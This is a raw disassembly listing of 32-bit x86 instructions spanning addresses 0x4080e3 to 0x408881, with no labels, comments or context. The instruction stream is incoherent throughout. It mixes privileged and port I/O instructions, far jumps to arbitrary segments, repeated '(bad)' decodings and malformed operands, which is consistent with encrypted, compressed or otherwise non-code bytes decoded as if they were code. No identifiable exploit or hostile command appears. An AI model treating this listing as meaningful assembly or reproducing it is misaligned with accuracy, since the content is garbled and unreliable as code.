  4080e3:	and    eax,0x68e3ff0d
  4080e8:	retf   0x1243
  4080eb:	push   edi
  4080ec:	aam    0x4c
  4080ee:	mov    al,ds:0xc70b643b
  4080f3:	test   eax,0xecd2cef9
  4080f8:	imul   ecx,DWORD PTR [eax+eiz*8+0x49],0x3b
  4080fd:	test   eax,edi
  4080ff:	dec    ebp
  408100:	push   0xe9a5512b
  408105:	pop    ds
  408106:	int    0xa8
  408108:	dec    ebp
  408109:	or     eax,0x2e9abec0
  40810e:	cli    
  40810f:	fs into 
  408111:	pop    edi
  408112:	jbe    0x408102
  408114:	and    dh,BYTE PTR es:[ebp+0x7e2ca4ff]
  40811b:	jnp    0x40811a
  40811d:	adc    eax,DWORD PTR [ecx-0x3f24f672]
  408123:	std    
  408124:	jns    0x40810c
  408126:	pop    edi
  408127:	imul   esi,DWORD PTR [ecx],0x35f5ea3e
  40812d:	aam    0xa8
  40812f:	jne    0x4080ce
  408131:	adc    BYTE PTR [ecx+esi*8],0x57
  408135:	add    esp,esi
  408137:	inc    eax
  408138:	cld    
  408139:	cld    
  40813a:	jne    0x4080c4
  40813c:	xor    al,0x4f
  40813e:	(bad)  
  40813f:	cld    
  408140:	aad    0x9a
  408142:	data16 or al,0x1e
  408145:	daa    
  408146:	pop    ss
  408147:	or     BYTE PTR [edx-0x22],cl
  40814a:	jmp    DWORD PTR [edx+0x10]
  40814d:	jle    0x408147
  40814f:	xchg   ebp,eax
  408150:	retf   0x65f7
  408153:	pop    ecx
  408154:	mov    eax,0x70ec64da
  408159:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40815a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40815b:	xchg   edi,eax
  40815c:	(bad)  
  40815d:	dec    eax
  40815e:	and    al,BYTE PTR [edi-0x7c161e3]
  408164:	or     eax,0xca48ba2
  408169:	jle    0x408116
  40816b:	addr16 in al,dx
  40816d:	stos   BYTE PTR es:[edi],al
  40816e:	mov    ch,0xbc
  408170:	(bad)  [ebx+0x51d7a30e]
  408176:	scas   al,BYTE PTR es:[edi]
  408177:	mov    ebx,0x3b70c1e8
  40817c:	lea    ebx,ds:0x7bfc08cc
  408182:	retf   
  408183:	nop
  408184:	xchg   DWORD PTR [eax+0x16],ebp
  408187:	rol    DWORD PTR [ebx-0x4c],1
  40818a:	mov    BYTE PTR [ecx-0x1c],bh
  40818d:	xchg   edi,eax
  40818e:	xor    al,0xad
  408190:	imul   esi,DWORD PTR [eax+0x4f294979],0xffffffe1
  408197:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408198:	retf   
  408199:	add    al,0x4e
  40819b:	pop    es
  40819c:	pop    esi
  40819d:	inc    edx
  40819e:	sub    BYTE PTR [ebx+0x27],0x50
  4081a2:	pop    esp
  4081a3:	mov    esi,0xf9899fdd
  4081a8:	loopne 0x40818c
  4081aa:	and    al,0x7d
  4081ac:	sub    dh,dh
  4081ae:	int3   
  4081af:	xchg   ebp,eax
  4081b0:	cdq    
  4081b1:	xor    edi,DWORD PTR [eax+eiz*2]
  4081b4:	mov    dl,0x35
  4081b6:	iret   
  4081b7:	ret    0xf3f8
  4081ba:	rcr    BYTE PTR [edx],0xf2
  4081bd:	push   ebp
  4081be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081bf:	xchg   edi,eax
  4081c0:	inc    ebx
  4081c1:	imul   edi,ecx,0xffffffc4
  4081c4:	add    bl,dl
  4081c6:	je     0x40817f
  4081c8:	and    cl,ch
  4081ca:	not    bh
  4081cc:	stos   BYTE PTR es:[edi],al
  4081cd:	fdiv   st(7),st
  4081cf:	xchg   ebx,eax
  4081d0:	xchg   ebp,eax
  4081d1:	adc    BYTE PTR [eax],bh
  4081d3:	clc    
  4081d4:	mov    ecx,edx
  4081d6:	add    al,bl
  4081d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081d9:	xor    dl,dl
  4081db:	add    al,0x2f
  4081dd:	push   esp
  4081de:	mov    ecx,0x53027b19
  4081e3:	ret    
  4081e4:	lods   eax,DWORD PTR ds:[esi]
  4081e5:	mov    cl,0x51
  4081e7:	scas   eax,DWORD PTR es:[edi]
  4081e8:	pop    esp
  4081e9:	fld    DWORD PTR [ebp-0x5316557f]
  4081ef:	push   ebp
  4081f0:	(bad)  
  4081f1:	mov    ecx,DWORD PTR ds:0xb7fcdfd4
  4081f7:	push   eax
  4081f8:	fbstp  TBYTE PTR [esp+edi*4]
  4081fb:	and    ecx,DWORD PTR [esi]
  4081fd:	scas   eax,DWORD PTR es:[edi]
  4081fe:	sbb    al,BYTE PTR [ecx+0x357360ee]
  408204:	add    bl,BYTE PTR [ecx+0x4e]
  408207:	sbb    cl,ch
  408209:	mov    ecx,cs
  40820b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40820c:	out    0x1b,eax
  40820e:	mov    ebx,0x6a557d19
  408213:	fs mov dl,0x3
  408216:	ret    
  408217:	pop    esp
  408218:	stc    
  408219:	iret   
  40821a:	sbb    eax,0x956fdd8e
  40821f:	or     cl,BYTE PTR [edx-0x9653b3c]
  408225:	pop    ds
  408226:	jge    0x4081d2
  408228:	outs   dx,BYTE PTR ds:[esi]
  408229:	scas   eax,DWORD PTR es:[edi]
  40822a:	cmp    ecx,DWORD PTR [esi-0x71]
  40822d:	pop    ss
  40822e:	lods   al,BYTE PTR ds:[esi]
  40822f:	push   ss
  408230:	and    bh,BYTE PTR [ebp-0x5f4061f9]
  408236:	repz bnd jge 0x408239
  40823a:	arpl   WORD PTR [eax-0x7c],bx
  40823d:	push   esp
  40823e:	mov    esi,0x37f3fdbc
  408243:	and    ch,BYTE PTR [edx+0x74fee64c]
  408249:	xchg   ebp,eax
  40824a:	cdq    
  40824b:	adc    edx,ebp
  40824d:	pop    es
  40824e:	jg     0x408271
  408250:	mov    edi,0x20c8c970
  408255:	mov    esi,0x81b0b16b
  40825a:	mov    bh,0xca
  40825c:	test   DWORD PTR ds:0x3ed7d791,esp
  408262:	scas   al,BYTE PTR es:[edi]
  408263:	lea    ecx,[esi-0x4035f68c]
  408269:	hlt    
  40826a:	mov    al,0x7c
  40826c:	(bad)  
  40826d:	xlat   BYTE PTR ds:[ebx]
  40826e:	jo     0x40820d
  408270:	cli    
  408271:	cli    
  408272:	cmp    esp,DWORD PTR [edx+0x21]
  408275:	jg     0x408271
  408277:	jae    0x40827c
  408279:	lock imul BYTE PTR [ecx-0x80]
  40827d:	xor    dl,BYTE PTR [ebx-0x6d]
  408280:	fnstenv [eax+0x62]
  408283:	addr16 in al,0x89
  408286:	lods   al,BYTE PTR ds:[esi]
  408287:	pop    eax
  408288:	rcr    DWORD PTR [edx-0x28d99859],1
  40828e:	mov    bh,BYTE PTR [esi+0x41]
  408291:	push   ss
  408292:	hlt    
  408293:	sbb    BYTE PTR [eax],dl
  408295:	push   0xffffff83
  408297:	push   0x20
  408299:	retf   0x5c09
  40829c:	jo     0x40829e
  40829e:	adc    eax,0x2811e03f
  4082a3:	in     al,0xaa
  4082a5:	jge    0x408290
  4082a7:	lahf   
  4082a8:	sub    edi,DWORD PTR [esi-0x6c]
  4082ab:	hlt    
  4082ac:	inc    edi
  4082ad:	sbb    al,0x11
  4082af:	push   cs
  4082b0:	jbe    0x40825b
  4082b2:	sub    bh,BYTE PTR [ecx+0x5a]
  4082b5:	mov    eax,ds:0x85e688f4
  4082ba:	ins    BYTE PTR es:[edi],dx
  4082bb:	pop    ebp
  4082bc:	bound  ecx,QWORD PTR [ebx+ebx*1]
  4082bf:	xchg   esi,eax
  4082c0:	adc    DWORD PTR [esi-0x5fd3c199],eax
  4082c6:	mov    esp,0x39c1af27
  4082cb:	aaa    
  4082cc:	sub    eax,0x1c4875f7
  4082d1:	push   esp
  4082d2:	js     0x4082b2
  4082d4:	cmp    dl,BYTE PTR [ecx-0x6eb6232b]
  4082da:	sbb    al,0x9f
  4082dc:	push   edx
  4082dd:	arpl   dx,dx
  4082df:	out    0xef,al
  4082e1:	and    esi,DWORD PTR cs:[edi+0x5b]
  4082e5:	cmp    eax,0x693ec99b
  4082ea:	lock add al,0xa2
  4082ed:	inc    esp
  4082ee:	mov    cl,0x2e
  4082f0:	arpl   WORD PTR [ebp+0x6741cb9f],di
  4082f6:	mov    WORD PTR [ebp-0x16],fs
  4082f9:	or     ebp,ebp
  4082fb:	sub    ebp,DWORD PTR [ecx]
  4082fd:	xor    ch,dl
  4082ff:	fst    DWORD PTR [eax+0x33ea7c78]
  408305:	cdq    
  408306:	mov    edx,DWORD PTR [edi+eax*8-0x5b]
  40830a:	and    DWORD PTR [esi],0xffffffa4
  40830d:	pop    ds
  40830e:	add    eax,0x885a5b8f
  408313:	add    BYTE PTR [ebx+0x66],0xfd
  408317:	mov    al,ds:0x14d6c985
  40831c:	test   al,0x8f
  40831e:	lock dec ecx
  408320:	mov    dh,0x9
  408322:	int3   
  408323:	mov    edx,eax
  408325:	xchg   ebp,eax
  408326:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408327:	cs push edx
  408329:	cmp    ebp,edx
  40832b:	push   eax
  40832c:	mov    bl,0x1a
  40832e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40832f:	or     al,al
  408331:	scas   eax,DWORD PTR es:[edi]
  408332:	loopne 0x40835a
  408334:	push   edx
  408335:	arpl   cx,sp
  408337:	ret    
  408338:	ret    
  408339:	in     al,0xc6
  40833b:	mov    esi,0x9c7f12f8
  408340:	push   cs
  408341:	rol    BYTE PTR [edi+0x42],1
  408344:	in     eax,0x8d
  408346:	fsubp  st(3),st
  408348:	sub    esi,ebx
  40834a:	mov    ah,0x3c
  40834c:	push   ss
  40834d:	pop    ds
  40834e:	cli    
  40834f:	and    dh,bh
  408351:	jnp    0x40837f
  408353:	cmp    dl,BYTE PTR [ecx+0x76]
  408356:	adc    eax,0x4d269626
  40835b:	out    dx,eax
  40835c:	adc    esp,edi
  40835e:	jmp    0xd9a9:0x11a288be
  408365:	ss dec esp
  408367:	pop    es
  408368:	pop    esp
  408369:	std    
  40836a:	add    edi,DWORD PTR [ecx+0x26591be]
  408370:	in     al,0x8f
  408372:	call   0x2f34:0x1af75415
  408379:	in     eax,dx
  40837a:	push   esi
  40837b:	rol    BYTE PTR [ebp-0x2b5efc49],1
  408381:	or     ecx,DWORD PTR [ecx+0x4155813c]
  408387:	(bad)  
  408388:	adc    DWORD PTR [esi+0x66],esi
  40838b:	cwde   
  40838c:	inc    esp
  40838d:	imul   esi,DWORD PTR [edx+ebx*1],0x50ed4e33
  408394:	push   esi
  408395:	lahf   
  408396:	leave  
  408397:	mov    ?,WORD PTR [esi]
  408399:	iret   
  40839a:	das    
  40839b:	jno    0x4083fd
  40839d:	cmp    BYTE PTR [esi-0x77],ah
  4083a0:	fisub  DWORD PTR [edx+0x59]
  4083a3:	mov    ebx,0x4f10e07
  4083a8:	mov    dh,0xd5
  4083aa:	dec    ecx
  4083ab:	and    DWORD PTR [edi+0x64678b40],edx
  4083b1:	push   esp
  4083b2:	cmp    eax,0x51549ac3
  4083b7:	fsubrp st(4),st
  4083b9:	cli    
  4083ba:	imul   eax,DWORD PTR [ebp-0x3f2ed829],0x4a
  4083c1:	cmp    ebp,0x3db3b9e6
  4083c7:	add    DWORD PTR [ebp-0x5d571c5a],eax
  4083cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083ce:	fcom   QWORD PTR [esi+0x302d830b]
  4083d4:	aam    0x14
  4083d6:	scas   eax,DWORD PTR es:[edi]
  4083d7:	xor    al,0x3
  4083d9:	push   esi
  4083da:	iret   
  4083db:	or     al,0xf4
  4083dd:	jne    0x4083aa
  4083df:	jecxz  0x408378
  4083e1:	xor    BYTE PTR [eax],dh
  4083e3:	out    dx,al
  4083e4:	add    DWORD PTR [ebx],esp
  4083e6:	sbb    bl,BYTE PTR [edx+0x74]
  4083e9:	aas    
  4083ea:	pushf  
  4083eb:	jbe    0x4083cd
  4083ed:	inc    ebx
  4083ee:	and    bl,cl
  4083f0:	add    eax,0xa9e8bb08
  4083f5:	repz or ch,ch
  4083f8:	dec    edi
  4083f9:	lds    ebp,FWORD PTR [eax-0x64623eb5]
  4083ff:	loop   0x408438
  408401:	mov    dh,al
  408403:	jmp    0x4083b8
  408405:	jg     0x4083e5
  408407:	xlat   BYTE PTR ds:[ebx]
  408408:	mov    fs,ecx
  40840a:	pop    eax
  40840b:	jb     0x408478
  40840d:	aas    
  40840e:	enter  0x1a9d,0x68
  408412:	cmp    BYTE PTR [esi],bh
  408414:	push   ebp
  408415:	imul   al
  408417:	mov    eax,0xf8c22690
  40841c:	pop    ebx
  40841d:	out    0x64,eax
  40841f:	xlat   BYTE PTR ds:[ebx]
  408420:	pop    esi
  408421:	movaps XMMWORD PTR [ebx],xmm3
  408424:	push   esp
  408425:	in     eax,0xb7
  408427:	cmp    al,0x61
  408429:	add    DWORD PTR [ebp+0x25],0x1b2c2f17
  408430:	sbb    DWORD PTR [ebx+0x6ed95f55],0x587270a6
  40843a:	mov    al,dh
  40843c:	and    bl,BYTE PTR [eax-0x47]
  40843f:	out    dx,al
  408440:	cli    
  408441:	(bad)  
  408442:	fucomp st(5)
  408444:	xor    eax,DWORD PTR [edi-0x6d]
  408447:	das    
  408448:	lds    esp,FWORD PTR ds:0xad057862
  40844e:	inc    ecx
  40844f:	xor    DWORD PTR [ebx+0x455ff439],eax
  408455:	(bad)  [edx-0x1e]
  408458:	inc    edi
  408459:	push   edx
  40845a:	xchg   edi,eax
  40845b:	je     0x408469
  40845d:	xor    al,0x12
  40845f:	pop    ebp
  408460:	jo     0x4084c3
  408462:	and    al,0x4e
  408464:	jnp    0x408433
  408466:	sbb    edi,ecx
  408468:	adc    esi,edi
  40846a:	jmp    0x9d88:0x3a5369c4
  408471:	mov    edi,DWORD PTR [edx+edi*2]
  408474:	adc    ah,ah
  408476:	or     bh,0x72
  408479:	data16 xchg BYTE PTR [edx+ecx*1-0x2edd9681],ah
  408481:	das    
  408482:	hlt    
  408483:	push   ds
  408484:	mov    es,WORD PTR [ebp+ecx*2+0x1a]
  408488:	mov    ebp,0x9add40cd
  40848d:	cmp    al,0x88
  40848f:	sub    esp,esi
  408491:	addr16 aas 
  408493:	push   esp
  408494:	xchg   edx,eax
  408495:	int3   
  408496:	mov    ah,0xc2
  408498:	test   DWORD PTR [edi],edi
  40849a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40849b:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40849d:	mov    ds:0x20444024,eax
  4084a2:	or     esp,ebp
  4084a4:	or     eax,0x8c85851a
  4084a9:	aas    
  4084aa:	dec    ebx
  4084ab:	cmp    esp,DWORD PTR [edi-0x19]
  4084ae:	lahf   
  4084af:	add    bh,al
  4084b1:	cmp    ebx,DWORD PTR cs:[edi+0x20]
  4084b5:	push   ebp
  4084b6:	call   FWORD PTR [edx-0x3d708c65]
  4084bc:	sub    bh,bl
  4084be:	xor    ebx,0xe5a16b09
  4084c4:	stc    
  4084c5:	repz dec ecx
  4084c7:	nop
  4084c8:	inc    esp
  4084c9:	mov    edx,0x4932716e
  4084ce:	cmp    ebp,DWORD PTR [ebx]
  4084d0:	repz sbb BYTE PTR [ecx-0x3d],cl
  4084d4:	inc    ebx
  4084d5:	xchg   edx,eax
  4084d6:	mov    ds:0xa84f6693,al
  4084db:	dec    edi
  4084dc:	(bad)  
  4084dd:	jnp    0x40848d
  4084df:	xor    al,0x75
  4084e1:	scas   eax,DWORD PTR es:[edi]
  4084e2:	leave  
  4084e3:	or     esp,ebp
  4084e5:	add    al,cl
  4084e7:	sub    dh,ch
  4084e9:	jo     0x4084d7
  4084eb:	or     al,bl
  4084ed:	(bad)  
  4084ee:	mov    al,0xe0
  4084f0:	sub    edi,DWORD PTR [edi+0x22]
  4084f3:	clc    
  4084f4:	or     ebx,DWORD PTR [esi]
  4084f6:	stos   DWORD PTR es:[edi],eax
  4084f7:	xlat   BYTE PTR ds:[ebx]
  4084f8:	gs jmp 0xd0f6623b
  4084fe:	jno    0x4084ee
  408500:	outs   dx,BYTE PTR ds:[esi]
  408501:	mov    al,0x38
  408503:	add    DWORD PTR [edx+ecx*1-0x70d5845b],edx
  40850a:	mov    ch,0x1b
  40850c:	push   0xffffff99
  40850e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40850f:	inc    ebp
  408510:	add    BYTE PTR [ecx+0x10],bh
  408513:	cmp    al,BYTE PTR [eax-0xc489c0f]
  408519:	pop    ebp
  40851a:	dec    eax
  40851b:	sbb    ebp,DWORD PTR [ecx]
  40851d:	(bad)  
  40851f:	mov    ebp,0x5354992a
  408524:	jle    0x4084dd
  408526:	dec    esi
  408527:	in     eax,dx
  408528:	test   eax,0x5fad6626
  40852d:	add    eax,DWORD PTR [ecx]
  40852f:	dec    edi
  408530:	ja     0x4084f2
  408532:	in     eax,0xa7
  408534:	fiadd  WORD PTR [esi]
  408536:	aam    0x94
  408538:	push   esp
  408539:	cmp    bl,cl
  40853b:	jp     0x4084f1
  40853d:	mov    esi,0xea1ca99c
  408542:	stc    
  408543:	out    0x2e,eax
  408545:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408546:	jg     0x408563
  408548:	xchg   ebx,eax
  408549:	shr    DWORD PTR [ebp+0x24],0x2a
  40854d:	stos   DWORD PTR es:[edi],eax
  40854e:	rcl    bl,1
  408550:	jae    0x408573
  408552:	stos   BYTE PTR es:[edi],al
  408553:	sbb    esp,DWORD PTR [ebx-0x62]
  408556:	outs   dx,BYTE PTR ds:[esi]
  408557:	sbb    BYTE PTR ds:0x1f1c14a8,ah
  40855d:	mov    bh,BYTE PTR [eax+0x28]
  408560:	fldcw  WORD PTR [edx+edi*8+0x47794e63]
  408567:	sub    al,0x6a
  408569:	inc    edi
  40856a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40856b:	ins    BYTE PTR es:[edi],dx
  40856c:	loope  0x4084f3
  40856e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40856f:	in     al,dx
  408570:	(bad)  
  408571:	lock push eax
  408573:	leave  
  408574:	sbb    BYTE PTR [esi],al
  408576:	sub    al,BYTE PTR [ebx+eax*1]
  408579:	mov    ah,0x76
  40857b:	or     BYTE PTR [eax-0x52b9458b],ah
  408581:	adc    al,0xfa
  408583:	pop    esi
  408584:	or     cl,BYTE PTR [esi]
  408586:	rol    BYTE PTR [edx-0x10],cl
  408589:	sbb    al,0x64
  40858b:	add    esi,DWORD PTR [edi+0x431c9cd1]
  408591:	leave  
  408592:	ret    0xdd2d
  408595:	arpl   si,cx
  408597:	fbld   TBYTE PTR [eax+0x7b]
  40859a:	and    al,0x51
  40859c:	out    0x99,al
  40859e:	or     ch,BYTE PTR [eax+0x64]
  4085a1:	or     eax,0x45ae0f61
  4085a6:	jecxz  0x4085a4
  4085a8:	pop    ds
  4085a9:	add    DWORD PTR [ecx-0x45],esi
  4085ac:	dec    ecx
  4085ad:	in     eax,dx
  4085ae:	xchg   edi,eax
  4085af:	dec    esp
  4085b0:	add    DWORD PTR [edi],eax
  4085b2:	xchg   esp,eax
  4085b3:	sub    dh,BYTE PTR [esi]
  4085b5:	lock xchg edx,eax
  4085b7:	push   ebp
  4085b8:	out    dx,al
  4085b9:	sub    BYTE PTR [esi-0x60447d1b],dl
  4085bf:	and    eax,0x1fd739c
  4085c4:	sub    DWORD PTR [edi+0x1b703dd2],ebp
  4085ca:	xchg   BYTE PTR [ecx-0x5f0d6648],cl
  4085d0:	push   ebx
  4085d1:	cmp    eax,0xec6d6a0e
  4085d6:	xchg   ebp,eax
  4085d7:	xor    al,0xc7
  4085d9:	inc    ebp
  4085da:	hlt    
  4085db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085dc:	test   DWORD PTR [eax+edi*8-0x1603ba75],ebx
  4085e3:	stos   BYTE PTR es:[edi],al
  4085e4:	and    eax,DWORD PTR [eax]
  4085e6:	add    BYTE PTR ds:0x84488431,bl
  4085ec:	les    ebx,FWORD PTR [ebp+0xc292524]
  4085f2:	push   0xffffffbe
  4085f4:	xchg   BYTE PTR [ebx],ch
  4085f6:	retf   
  4085f7:	jns    0x408612
  4085f9:	add    DWORD PTR [ebx-0x7c7c9f0f],0x5c
  408600:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408601:	inc    esp
  408602:	out    0xfd,eax
  408604:	in     al,dx
  408605:	pop    es
  408606:	retf   0xd48c
  408609:	mov    eax,ds:0xf48297dd
  40860e:	inc    esi
  40860f:	popf   
  408610:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408611:	push   0x6c
  408613:	std    
  408614:	outs   dx,DWORD PTR ds:[esi]
  408615:	or     BYTE PTR [eax+0x3b],al
  408618:	mov    edx,0x4c57d757
  40861d:	cmp    BYTE PTR [esp+ebx*4-0x66],dh
  408621:	out    0xc1,al
  408623:	loop   0x40868e
  408625:	mov    eax,0x8af94fdc
  40862a:	sbb    DWORD PTR [ecx-0x5b],0x8bb06e6c
  408631:	icebp  
  408632:	pop    ebx
  408633:	add    DWORD PTR [ebp-0x7f0db1f6],eax
  408639:	xchg   ebx,eax
  40863a:	fimul  WORD PTR [eax+0x74]
  40863d:	xor    esi,edi
  40863f:	(bad)  
  408640:	adc    DWORD PTR [ebx-0x73f51c70],ebx
  408646:	sub    bh,BYTE PTR cs:[edi]
  408649:	das    
  40864a:	addr16 cwde 
  40864c:	jecxz  0x4085eb
  40864e:	ss mov edx,0x99ac0e2b
  408654:	into   
  408655:	aas    
  408656:	mov    edx,0x2499c5e3
  40865b:	pop    ecx
  40865c:	jmp    0x3c5e:0x25082d7a
  408663:	push   ds
  408664:	push   0xe1a96438
  408669:	add    BYTE PTR [eax-0x7b6a489b],0xa1
  408670:	add    eax,0x792cb8c
  408675:	int3   
  408676:	mov    ds:0xcb7c542d,al
  40867b:	jp     0x4086e0
  40867d:	bound  esp,QWORD PTR [ebx]
  40867f:	int3   
  408680:	hlt    
  408681:	mov    ds:0x8b181f4f,eax
  408686:	inc    ebx
  408687:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408688:	inc    ebx
  408689:	cdq    
  40868a:	and    ebx,DWORD PTR [esi+edx*8+0x75]
  40868e:	mov    edx,edx
  408690:	daa    
  408691:	mov    ch,0xa7
  408693:	ret    
  408694:	xlat   BYTE PTR ds:[ebx]
  408695:	jmp    FWORD PTR [esi-0x2642ff2b]
  40869b:	add    DWORD PTR [ecx-0x2f55497c],0xd8205a16
  4086a5:	sbb    ecx,DWORD PTR [ecx]
  4086a7:	mov    ds:0xf900362c,al
  4086ac:	rcr    BYTE PTR [esp+ebx*2+0xa0bde2],cl
  4086b3:	mov    edx,0x5da5f10f
  4086b8:	repnz adc bp,WORD PTR [eax]
  4086bc:	aad    0x44
  4086be:	push   esp
  4086bf:	pop    ds
  4086c0:	cmp    ebp,DWORD PTR [edi]
  4086c2:	mul    DWORD PTR [ebp-0x3ed4cf46]
  4086c8:	inc    esp
  4086c9:	ds (bad) 
  4086cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086cc:	mov    ebx,0xbd978ef5
  4086d1:	jp     0x40867e
  4086d3:	push   ss
  4086d4:	jle    0x408704
  4086d6:	jp     0x408679
  4086d8:	dec    ebp
  4086d9:	dec    ebx
  4086da:	jno    0x40867a
  4086dc:	and    bl,BYTE PTR [edi-0x77fe8090]
  4086e2:	addr16 call 0x5f46019
  4086e8:	ins    BYTE PTR es:[edi],dx
  4086e9:	outs   dx,DWORD PTR ds:[esi]
  4086ea:	xchg   edi,eax
  4086eb:	loop   0x408739
  4086ed:	mov    dh,0x6b
  4086ef:	fs rcl BYTE PTR ss:[esi+0x6deb753a],cl
  4086f7:	test   DWORD PTR [ecx+0x4a126aa1],eax
  4086fd:	aad    0x1f
  4086ff:	mov    al,0x35
  408701:	sbb    DWORD PTR [ebp-0x7],edx
  408704:	ret    0x7b53
  408707:	fs (bad) 
  408709:	sahf   
  40870a:	in     eax,dx
  40870b:	call   0x197f4070
  408710:	stc    
  408711:	(bad)
  408714:	inc    ebp
  408715:	cs clc 
  408717:	mov    DWORD PTR [edi-0x54],ebp
  40871a:	int    0xb3
  40871c:	fimul  DWORD PTR [eax]
  40871e:	pop    ebx
  40871f:	jnp    0x40871b
  408721:	inc    esp
  408722:	adc    dh,BYTE PTR [ecx+ecx*4+0x7381ff79]
  408729:	cmp    BYTE PTR [eax+0xae9fdc5],0x4
  408730:	mov    BYTE PTR [ebp+0x3f763315],bh
  408736:	out    0x5b,al
  408738:	xchg   edi,eax
  408739:	sbb    eax,0x7fe0fb0b
  40873e:	fmul   QWORD PTR [edx+0x4f1aca60]
  408744:	repnz push 0x6c
  408747:	dec    ebp
  408748:	push   edx
  408749:	pop    es
  40874a:	jno    0x408786
  40874c:	cmc    
  40874d:	aas    
  40874e:	xor    DWORD PTR [ebx+0x146ef38b],ebp
  408754:	cmp    esp,esi
  408756:	stos   DWORD PTR es:[edi],eax
  408757:	mov    edx,0x3e25c3fc
  40875c:	pop    esp
  40875d:	fld    TBYTE PTR ds:0xd57677d9
  408763:	sbb    al,0x1a
  408765:	fwait
  408766:	push   ecx
  408767:	ds push ss
  408769:	dec    esp
  40876a:	xor    al,bh
  40876c:	add    DWORD PTR [ecx],edx
  40876e:	fdiv   QWORD PTR [ebp+0x72ae70b8]
  408774:	fs jle 0x408765
  408777:	pop    edi
  408778:	xchg   esi,eax
  408779:	cld    
  40877a:	and    BYTE PTR [eax],ch
  40877c:	push   ecx
  40877d:	ret    0xd82
  408780:	mov    BYTE PTR [eax],al
  408782:	mov    ds:0xcde32726,al
  408787:	js     0x4087dd
  408789:	(bad)  
  40878a:	sahf   
  40878b:	mov    dh,0xe
  40878d:	(bad)  
  40878e:	mov    WORD PTR [edi],?
  408790:	stos   DWORD PTR es:[edi],eax
  408791:	sub    esi,DWORD PTR [edx-0x3ab951af]
  408797:	lods   eax,DWORD PTR ds:[esi]
  408798:	stc    
  408799:	pop    es
  40879a:	fild   QWORD PTR [ecx-0x25]
  40879d:	daa    
  40879e:	jmp    0x40873d
  4087a0:	mov    al,0x64
  4087a2:	xchg   esp,eax
  4087a3:	mov    eax,0xea1eae26
  4087a8:	cmp    dh,BYTE PTR [ebp+0x5e]
  4087ab:	outs   dx,BYTE PTR ds:[esi]
  4087ac:	mov    ds:0x99027eb0,al
  4087b1:	mov    WORD PTR [edi-0x1b34db8f],fs
  4087b7:	in     al,dx
  4087b8:	sub    bl,BYTE PTR [edi-0x4da01b69]
  4087be:	jae    0x408814
  4087c0:	xchg   esp,eax
  4087c1:	nop
  4087c2:	fimul  WORD PTR [edi-0x56]
  4087c5:	mov    BYTE PTR [esp+ebx*4-0xa9fdbd4],bh
  4087cc:	cli    
  4087cd:	fiadd  WORD PTR [eax+0x4c]
  4087d0:	sbb    eax,0xaf9b1b59
  4087d5:	inc    esp
  4087d6:	mov    BYTE PTR [eax-0x14],dl
  4087d9:	xchg   ecx,eax
  4087da:	in     al,dx
  4087db:	aad    0x50
  4087dd:	mov    esi,0xbb65957a
  4087e2:	or     edx,esp
  4087e4:	ret    0x75b8
  4087e7:	std    
  4087e8:	in     al,0x1
  4087ea:	add    ecx,DWORD PTR [ebp+0x5f]
  4087ed:	ss inc ebx
  4087ef:	sar    esi,cl
  4087f1:	jbe    0x408868
  4087f3:	mov    esi,0x44f9a4f3
  4087f8:	pop    es
  4087f9:	das    
  4087fa:	mov    dh,0x4a
  4087fc:	addr16 dec ecx
  4087fe:	out    0x29,al
  408800:	ror    BYTE PTR [ebp-0x47723624],1
  408806:	jmp    0xb827:0xaec69d42
  40880d:	fisttp WORD PTR [esi+0x27d71807]
  408813:	leave  
  408814:	cmp    al,0xf0
  408816:	shl    DWORD PTR [ecx],0x56
  408819:	xlat   BYTE PTR ds:[ebx]
  40881a:	stos   DWORD PTR es:[edi],eax
  40881b:	outs   dx,DWORD PTR ds:[esi]
  40881c:	add    BYTE PTR [edx+0x46],cl
  40881f:	scas   eax,DWORD PTR es:[edi]
  408820:	sbb    esp,DWORD PTR [edx+0x7d]
  408823:	js     0x4087f9
  408825:	fs cmp al,0x18
  408828:	mov    bl,0xb8
  40882a:	je     0x40881b
  40882c:	and    ebp,DWORD PTR [ebx]
  40882e:	in     eax,0xd5
  408830:	mov    ebp,DWORD PTR [edi]
  408832:	mov    bh,0x3d
  408834:	stc    
  408835:	sub    al,ah
  408837:	jge    0x408836
  408839:	dec    eax
  40883a:	add    eax,0xa39ce051
  40883f:	(bad)  
  408840:	or     al,0x40
  408842:	sbb    ah,BYTE PTR [ebx+0x38236bcd]
  408848:	cmp    dl,BYTE PTR [ebx]
  40884a:	imul   ecx,DWORD PTR [edx],0x1e76acc2
  408850:	cmc    
  408851:	dec    ecx
  408852:	vpsubusw xmm0,xmm6,xmm3
  408856:	or     al,0xe4
  408858:	fldenv [edi-0x7c]
  40885b:	jmp    0xf1794055
  408860:	mov    ecx,0x6986e850
  408865:	push   eax
  408866:	xor    dl,dh
  408868:	adc    DWORD PTR [eax+0x673d32f0],edx
  40886e:	inc    edi
  40886f:	push   eax
  408870:	pop    esp
  408871:	in     al,0xcd
  408873:	scas   al,BYTE PTR es:[edi]
  408874:	cmc    
  408875:	push   ebx
  408876:	mov    ecx,cs
  408878:	jae    0x408879
  40887a:	in     eax,dx
  40887b:	(bad)  
  40887c:	daa    
  40887d:	bound  eax,QWORD PTR [edi]
  40887f:	outs   dx,BYTE PTR ds:[esi]
  408880:	ins    DWORD PTR es:[edi],dx
  408881:	cmp    DWORD PTR [eax+eax*2+0x245cada],ebx
